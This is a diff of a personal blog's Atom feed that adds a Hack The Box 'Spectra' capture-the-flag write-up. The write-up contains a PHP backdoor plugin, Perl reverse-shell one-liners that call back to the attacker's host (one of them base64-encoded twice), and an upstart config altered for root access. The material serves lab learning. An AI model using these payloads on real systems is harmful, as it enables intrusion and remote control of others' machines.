@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-06-13T18:36:43-07:00</updated><id>/feed.xml</id><title type="html">Alex Loney</title><subtitle>Computer programming, cyber security, and baking! This blog has it all!</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Tenet Writeup</title><link href="/blog/writeup/htb/htb-tenet/" rel="alternate" type="text/html" title="HTB: Tenet Writeup" /><published>2021-06-12T12:00:00-07:00</published><updated>2021-06-12T12:00:00-07:00</updated><id>/blog/writeup/htb/htb-tenet</id><content type="html" xml:base="/blog/writeup/htb/htb-tenet/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-06-27T11:47:22-07:00</updated><id>/feed.xml</id><title type="html">Alex Loney</title><subtitle>Computer programming, cyber security, and baking! This blog has it all!</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Tenet Writeup</title><link href="/blog/writeup/htb/htb-tenet/" rel="alternate" type="text/html" title="HTB: Tenet Writeup" /><published>2021-06-12T12:00:00-07:00</published><updated>2021-06-12T12:00:00-07:00</updated><id>/blog/writeup/htb/htb-tenet</id><content type="html" xml:base="/blog/writeup/htb/htb-tenet/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -170,7 +170,182 @@ Mysql Pass: Opera2112&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/enableSSH.sh
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;After executing the above a few times to make sure that the SSH key has made it in, we can then SSH in as root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb medium" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">New Blog Who Dis</title><link href="/blog/new-blog-who-dis/" rel="alternate" type="text/html" title="New Blog Who Dis" /><published>2021-06-07T15:15:00-07:00</published><updated>2021-06-07T15:15:00-07:00</updated><id>/blog/new-blog-who-dis</id><content type="html" xml:base="/blog/new-blog-who-dis/">&lt;p&gt;I’d like to welcome you to my blog!!&lt;/p&gt;
+&lt;p&gt;After executing the above a few times to make sure that the SSH key has made it in, we can then SSH in as root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb medium" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Spectra Writeup</title><link href="/blog/writeup/htb/htb-spectra/" rel="alternate" type="text/html" title="HTB: Spectra Writeup" /><published>2021-06-08T12:22:00-07:00</published><updated>2021-06-08T12:22:00-07:00</updated><id>/blog/writeup/htb/htb-spectra</id><content type="html" xml:base="/blog/writeup/htb/htb-spectra/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;p&gt;I began this box with a standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/spectra 10.10.10.229
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-06-08 13:01 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.229
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.077s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 996 closed ports
+PORT     STATE SERVICE          VERSION
+22/tcp   open  ssh              OpenSSH 8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp   open  http             nginx 1.17.4
+3306/tcp open  mysql            MySQL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+8081/tcp open  blackice-icecap?
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;46.10 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
+
+&lt;p&gt;From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; enumeration, there were a few interesting ports, but checking out port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; to begin with, that lead to a simple homepage which listed two linkes, one went to a Wordpress website and the second went to what appears to be a copy of it that allows directory listing. There was one interesting file in the directory, which was a copy of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-config.php&lt;/code&gt; file with a different extension, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-config.php.save&lt;/code&gt;. Looking at that file, we have some potential MySQL credentials:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ** MySQL settings - You can get this info from your web host ** //&lt;/span&gt;
+&lt;span class=&quot;cd&quot;&gt;/** The name of the database for WordPress */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DB_NAME&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;dev&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** MySQL database username */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DB_USER&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;devtest&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** MySQL database password */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DB_PASSWORD&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;devteam01&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** MySQL hostname */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DB_HOST&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;localhost&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Credentials noted for future reference, if needed. Attempting to log into the MySQL DB just results in a failure that my IP is unauthorized.&lt;/p&gt;
+
+&lt;p&gt;Visiting the Wordpress site at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/main&lt;/code&gt; reveals a working Wordpress installation with one post from an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator&lt;/code&gt;. Visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-admin.php&lt;/code&gt; prompts for a login, which successfully works using the database password from earlier&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: administrator
+Password: devteam01
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The Admin panel doesn’t appear to be able to modify theme files, so I resorted to uploading a malicious plugin. &lt;a href=&quot;https://www.hackingarticles.in/wordpress-reverse-shell/&quot;&gt;See here for details on obtaining a reverse shell through WordPress&lt;/a&gt;. I crafted a WordPress plugin to allow command execution:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;rshell.php
+&amp;lt;?php
+
+/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Plugin Name: Wordpress Reverse Shell
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Author: Me
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;isset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])){&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        die&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+?&amp;gt;
+
+Usage: http://target.com/simple-backdoor.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;+/etc/passwd
+                                                                                                                                                                                                                                             
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;zip rshell.zip rshell.php          
+updating: rshell.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;deflated 30%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In WordPress admin, I selected Plugins -&amp;gt; Add New -&amp;gt; Browse -&amp;gt; Upload -&amp;gt; Activate. This allowed me to upload and activate this malicious WordPress plugin to obtain a backdoor. The backdoor is then uploaded at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.229/main/wp-content/plugins/rshell/rshell.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;With the backdoor uploaded, I can play with different command execution and determine information about the machine. I had issues using a standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; reverse shell, so I resorted to using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl&lt;/code&gt; reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e &apos;use Socket;$i=&quot;10.10.14.204&quot;;$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, some of the values in that string (specifically the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt; character) will cause issues in a URL, so I base64 encoded the payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuMjA0IjskcD05MDAwO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9OycK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, that payload contains a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; character, which I suspect will also cause issues as it may get treated as a space. So I base64 encoded it again:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Y0dWeWJDQXRaU0FuZFhObElGTnZZMnRsZERza2FUMGlNVEF1TVRBdU1UUXVNakEwSWpza2NEMDVNREF3TzNOdlkydGxkQ2hUTEZCR1gwbE9SVlFzVTA5RFMxOVRWRkpGUVUwc1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLVHRwWmloamIyNXVaV04wS0ZNc2MyOWphMkZrWkhKZmFXNG9KSEFzYVc1bGRGOWhkRzl1S0NScEtTa3BLWHR2Y0dWdUtGTlVSRWxPTENJK0psTWlLVHR2Y0dWdUtGTlVSRTlWVkN3aVBpWlRJaWs3YjNCbGJpaFRWRVJGVWxJc0lqNG1VeUlwTzJWNFpXTW9JaTlpYVc0dmMyZ2dMV2tpS1R0OU95Y0s=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That looks better! So to execute this, we must base64 decode it twice and send that to bash.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Y0dWeWJDQXRaU0FuZFhObElGTnZZMnRsZERza2FUMGlNVEF1TVRBdU1UUXVNakEwSWpza2NEMDVNREF3TzNOdlkydGxkQ2hUTEZCR1gwbE9SVlFzVTA5RFMxOVRWRkpGUVUwc1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLVHRwWmloamIyNXVaV04wS0ZNc2MyOWphMkZrWkhKZmFXNG9KSEFzYVc1bGRGOWhkRzl1S0NScEtTa3BLWHR2Y0dWdUtGTlVSRWxPTENJK0psTWlLVHR2Y0dWdUtGTlVSRTlWVkN3aVBpWlRJaWs3YjNCbGJpaFRWRVJGVWxJc0lqNG1VeUlwTzJWNFpXTW9JaTlpYVc0dmMyZ2dMV2tpS1R0OU95Y0s= | base64 -d | base64 -d | bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Crafting this into a payload to our PHP backdoor we get:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.229/main/wp-content/plugins/rshell/rshell.php?cmd=echo%20Y0dWeWJDQXRaU0FuZFhObElGTnZZMnRsZERza2FUMGlNVEF1TVRBdU1UUXVNakEwSWpza2NEMDVNREF3TzNOdlkydGxkQ2hUTEZCR1gwbE9SVlFzVTA5RFMxOVRWRkpGUVUwc1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLVHRwWmloamIyNXVaV04wS0ZNc2MyOWphMkZrWkhKZmFXNG9KSEFzYVc1bGRGOWhkRzl1S0NScEtTa3BLWHR2Y0dWdUtGTlVSRWxPTENJK0psTWlLVHR2Y0dWdUtGTlVSRTlWVkN3aVBpWlRJaWs3YjNCbGJpaFRWRVJGVWxJc0lqNG1VeUlwTzJWNFpXTW9JaTlpYVc0dmMyZ2dMV2tpS1R0OU95Y0s=%20|%20base64%20-d%20|%20base64%20-d%20|%20bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And catching it with a netcat listener:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lnvp 9000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Which receives a successful callback!&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;Privesc&lt;/h1&gt;
+
+&lt;p&gt;Now that we’re logged in as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nginx&lt;/code&gt; user, we can begin enumeration. Running linpeas, it highlighted a few things including:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd
+SummerHereWeCome!!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That’s interesting! Trying that as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user didn’t work, but trying that as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;katie&lt;/code&gt; user worked! We have a user SSH shell!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: katie
+Password: SummerHereWeCome!!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Checking what &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;katie&lt;/code&gt; can do, it looks like we have sudo permission to run a program:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+User katie may run the following commands on spectra:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SETENV: NOPASSWD: /sbin/initctl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sbin/initctl&lt;/code&gt; program appears to be for starting and stopping services which are located in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/init&lt;/code&gt; directory. Looking in that directory there are a few interesting services:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-larth&lt;/span&gt;
+total 768K
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test9.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test8.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test7.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test6.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test5.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test4.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test3.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test2.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test10.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test1.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt;  1 root developers  478 Jun 29  2020 test.conf
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Interesting, the group &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;developers&lt;/code&gt; has read/write access to these files, are we in that group?&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;groups
+&lt;/span&gt;katie developers
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Great! We can update these files! I then updated the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test1&lt;/code&gt; file to add a reverse shell to it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;test1.conf
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+pre-start script
+    perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;use Socket;$i=&quot;10.10.14.204&quot;;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;] Node Test Starting&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/log/nodetest.log
+end script
+...&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;snip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Starting this with the command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /sbin/initctl start test1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And catching the reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 9001
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We successfully become root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">New Blog Who Dis</title><link href="/blog/new-blog-who-dis/" rel="alternate" type="text/html" title="New Blog Who Dis" /><published>2021-06-07T15:15:00-07:00</published><updated>2021-06-07T15:15:00-07:00</updated><id>/blog/new-blog-who-dis</id><content type="html" xml:base="/blog/new-blog-who-dis/">&lt;p&gt;I’d like to welcome you to my blog!!&lt;/p&gt;
 
 &lt;p&gt;This blog is going to serve as my online resource for sharing InfoSec related topics, cooking, tech tips, and various other related material!&lt;/p&gt;
 
